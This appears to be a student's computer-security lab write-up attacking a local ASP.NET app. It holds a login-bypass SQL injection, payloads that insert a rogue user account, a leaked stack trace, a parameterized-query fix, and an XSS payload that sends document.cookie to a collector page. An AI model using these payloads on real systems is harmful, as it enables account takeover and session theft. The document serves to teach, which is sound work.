# Task 1

' or '1'='1


# Task 2

After inserting wrong SQL injection we get part of source code that caused exception.

http://localhost:49834/login.aspx


Server Error in '/' Application.
Incorrect syntax near 'wrong'.
Unclosed quotation mark after the character string '" ---' AND Password='''.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.

Exception Details: System.Data.SqlClient.SqlException: Incorrect syntax near 'wrong'.
Unclosed quotation mark after the character string '" ---' AND Password='''.

Source Error:

```
Line 25:             SqlCommand sqlc = new SqlCommand("SELECT Record FROM Table_Users WHERE Username='" + username + "' AND Password='" + password + "'");
Line 26:             sqlc.Connection = conn;
Line 27:             SqlDataReader sdr = sqlc.ExecuteReader();
Line 28:             if (sdr.HasRows == false)
Line 29:             {
```

Source File: 
```E:\EDA263_Computer-Security\EDA263_CODE\Lab4\cs_lab4\myWebApplication\SQLaccess.cs    Line: 27
```

Stack Trace:

```
[SqlException (0x80131904): Incorrect syntax near 'wrong'.
Unclosed quotation mark after the character string '" ---' AND Password='''.]
   System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +2444190
   System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction) +5775712
   System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose) +285
   System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady) +4169
   System.Data.SqlClient.SqlDataReader.TryConsumeMetaData() +58
   System.Data.SqlClient.SqlDataReader.get_MetaData() +89
   System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString, Boolean isInternal, Boolean forDescribeParameterEncryption) +409
   System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async, Int32 timeout, Task& task, Boolean asyncWrite, Boolean inRetry, SqlDataReader ds, Boolean describeParameterEncryptionRequest) +2127
   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, TaskCompletionSource`1 completion, Int32 timeout, Task& task, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry) +911
   System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method) +64
   System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method) +240
   System.Data.SqlClient.SqlCommand.ExecuteReader() +99
   myWebApplication.SQLaccess.checkUserPass(String username, String password) in E:\EDA263_Computer-Security\EDA263_CODE\Lab4\cs_lab4\myWebApplication\SQLaccess.cs:27
   myWebApplication.login.submit_Click(Object sender, EventArgs e) in E:\EDA263_Computer-Security\EDA263_CODE\Lab4\cs_lab4\myWebApplication\login.aspx.cs:21
   System.Web.UI.WebControls.Button.OnClick(EventArgs e) +9815206
   System.Web.UI.WebControls.Button.RaisePostBackEvent(String eventArgument) +204
   System.Web.UI.WebControls.Button.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument) +12
   System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument) +15
   System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData) +35
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +1639


Version Information: Microsoft .NET Framework Version:4.0.30319; ASP.NET Version:4.7.2633.0 
```

# Task 3

- With the information you found in the debugging output, what can you do? 
- Can you create a new account without having administrative privileges? 
- How did you do it?

```
SqlCommand sqlc = new SqlCommand("SELECT Record FROM Table_Users WHERE Username='" + username + "' AND Password='" + password + "'");
```

Comment will do nothing:
```
`--`

'; ... ;-- 

"SELECT Record FROM Table_Users WHERE Username=''; ... ;-- ' AND Password=''"

'; INSERT INTO Table_Users (Username, Password) VALUES ('adminxxx','adminxxx') ;-- 

' except CREATE TABLE Table_Users (Username varchar(30), Password varchar(30)) ; -- 
```

# Task 4
```
//Task 4: uncomment here
SqlCommand sqlc = new SqlCommand("SELECT Record FROM Table_Users WHERE Username=@username AND Password=@password");
sqlc.Parameters.AddWithValue("@username", username);
sqlc.Parameters.AddWithValue("@password", password);
```
# Task 5

Cross-site scripting:

Go to feedback and upload:
```
%3cscript>document.write('%3cimg src="http://localhost:49834/WriteCookie.aspx?Cookie='%2bdocument.cookie%2b'">');%3c/script>
```


